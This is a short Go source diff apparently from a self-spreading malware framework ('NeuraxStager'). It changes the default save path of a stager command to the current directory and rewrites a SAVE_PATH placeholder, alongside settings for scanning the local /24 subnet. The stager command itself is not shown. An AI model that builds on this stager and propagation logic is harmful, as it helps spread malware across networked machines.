@@ -154,7 +154,7 @@ var N = __N{
 	CommProto:                "udp",
 	ScanRequiredPort:         0,
 	LocalIp:                  cf.GetLocalIp(),
-	Path:                     "random",
+	Path:                     ".",
 	FileName:                 "random",
 	Platform:                 runtime.GOOS,
 	Cidr:                     cf.GetLocalIp() + "/24",
@@ -276,6 +276,10 @@ func NeuraxStager() string {
 	}
 	if N.Path == "random" {
 		N.Path = cf.RandomSelectStr(paths)
+	}
+	if N.Path == "." {
+		selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH/", "./", -1)
+		selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH\\", "", -1)
 	}
 	if N.FileName == "random" {
 		N.FileName = cf.RandomString(cf.RandomInt(4, 10))
